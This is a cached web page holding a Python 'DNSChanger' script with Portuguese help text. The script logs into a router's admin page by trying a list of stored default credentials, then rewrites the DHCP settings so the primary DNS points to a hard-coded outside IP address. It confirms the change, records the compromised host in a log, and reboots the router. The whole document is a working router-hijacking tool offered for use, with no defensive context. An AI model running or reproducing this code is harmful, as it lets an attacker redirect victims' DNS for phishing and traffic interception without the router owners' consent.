
<!-- saved from url=(0155)http://webcache.googleusercontent.com/search?q=cache:WY8Y2rsmsNUJ:goldenkash.com/application/class/routers_py/router.PNRT150M.py+&cd=12&hl=en&ct=clnk&gl=us -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!--<base href="http://goldenkash.com/application/class/routers_py/router.PNRT150M.py">--><base href="."><style>body{margin-left:0;margin-right:0;margin-top:0}#bN015htcoyT__google-cache-hdr{background:#f5f5f5;font:13px arial,sans-serif;text-align:left;color:#202020;border:0;margin:0;border-bottom:1px solid #cecece;line-height:16px;padding:16px 28px 24px 28px}#bN015htcoyT__google-cache-hdr *{display:inline;font:inherit;text-align:inherit;color:inherit;line-height:inherit;background:none;border:0;margin:0;padding:0;letter-spacing:0}#bN015htcoyT__google-cache-hdr a{text-decoration:none;color:#1a0dab}#bN015htcoyT__google-cache-hdr a:hover{text-decoration:underline}#bN015htcoyT__google-cache-hdr a:visited{color:#609}#bN015htcoyT__google-cache-hdr div{display:block;margin-top:4px}#bN015htcoyT__google-cache-hdr b{font-weight:bold;display:inline-block;direction:ltr}</style><style>pre{white-space:pre-wrap}</style></head><body><div id="bN015htcoyT__google-cache-hdr"><div><span>This is Google's cache of <a href="http://goldenkash.com/application/class/routers_py/router.PNRT150M.py">http://goldenkash.com/application/class/routers_py/router.PNRT150M.py</a>.</span>&nbsp;<span>It is a snapshot of the page as it appeared on Sep 16, 2018 13:42:51 GMT.</span>&nbsp;<span>The <a href="http://goldenkash.com/application/class/routers_py/router.PNRT150M.py">current page</a> could have changed in the meantime.</span>&nbsp;<a href="http://support.google.com/websearch/bin/answer.py?hl=en&amp;p=cached&amp;answer=1687222"><span>Learn more</span>.</a></div><span style="display:inline-block;margin-top:8px;color:#717171"><span>Tip: To quickly find your search term on this page, press <b>Ctrl+F</b> or <b>⌘-F</b> (Mac) and use the find bar.</span></span></div><div style="position:relative; margin:8px;"><pre>#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse, requests, md5, base64, os

from scan import password
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(description='Script for DNSChanger by Ghost', prog='Ghost', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=100,width=200))
parser.add_argument("-dns1", "--dns1", help = "Define o dns primário", metavar='', default='192.99.187.193', required=False)
parser.add_argument("-dns2", "--dns2", help = "Define o dns secundário", metavar='', default='8.8.4.4', required=False)
parser.add_argument("-host", "--host", help = "Define o ip e porta do router a ser executado", metavar='', default='a', required=False)

args = parser.parse_args()

dns1 = args.dns1
dns2 = args.dns2
host = args.host.replace("http://","")

router = requests.Session()

def stringToBase64(s):
    return base64.b64encode(s.encode('utf-8'))

for x in password.Credentials:
    login = router.get("http://"+str(x)+"@"+str(host))
    if login.status_code == 200:
        user = stringToBase64(x)
        break

get_dados = router.get("http://"+x+"@"+host+"/internet/lan.asp")
soup = BeautifulSoup(get_dados.content, 'html.parser')

lanIp = soup.find(attrs={"name": "lanIp"})
lanIp = lanIp['value']

lanNetmask = soup.find(attrs={"name": "lanNetmask"})
lanNetmask = lanNetmask['value']

dhcpStart = soup.find(attrs={"name": "dhcpStart"})
dhcpStart = dhcpStart['value']

dhcpEnd = soup.find(attrs={"name": "dhcpEnd"})
dhcpEnd = dhcpEnd['value']

dhcpLeaseMin = soup.find(attrs={"name": "dhcpLeaseMin"})
dhcpLeaseMin = dhcpLeaseMin['value']

data = {
    'hostname':'PACIFIC-BB06A3',
    'lanIp':lanIp,
    'lanNetmask':lanNetmask,
    'lanDhcpType':'SERVER',
    'dhcpStart':dhcpStart,
    'dhcpEnd':dhcpEnd,
    'dhcpGateway':'192.168.0.1',
    'chBlockStatic':'on',
    'blockStatic':'1',
    'dnspEnbl':'0',
    'dhcpPriDns':dns1,
    'dhcpSecDns':dns2,
    'dhcpLeaseMin':dhcpLeaseMin,
    'dhcpLease':'86400',
    'igmpEnbl':'0',
    'upnpEnbl':'1',
    'save':'Save'
}

try:
    changeDNS = router.post("http://"+x+"@"+host+"/goform/setLan", data=data)
except:
    pass

testeChangeDNS = router.get("http://"+x+"@"+host+"/internet/lan.asp")
if dns1 in testeChangeDNS.text:
    print("DNS alterado com sucesso!")
    os.system("cd /var/www/html/logs;php gravar.php "+host)

header = {
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding':'gzip, deflate',
    'Accept-Language':'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Authorization':'Basic '+user,
    'Connection':'keep-alive',
    'Host':host,
    'Referer':'http://'+host+'/internet/lan.asp',
    'Upgrade-Insecure-Requests':'1',
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
}

try:
    reboot = router.get("http://"+host+"/goform/sysReboot", timeout=3, headers=header)
except:
    pass
</pre></div></body></html>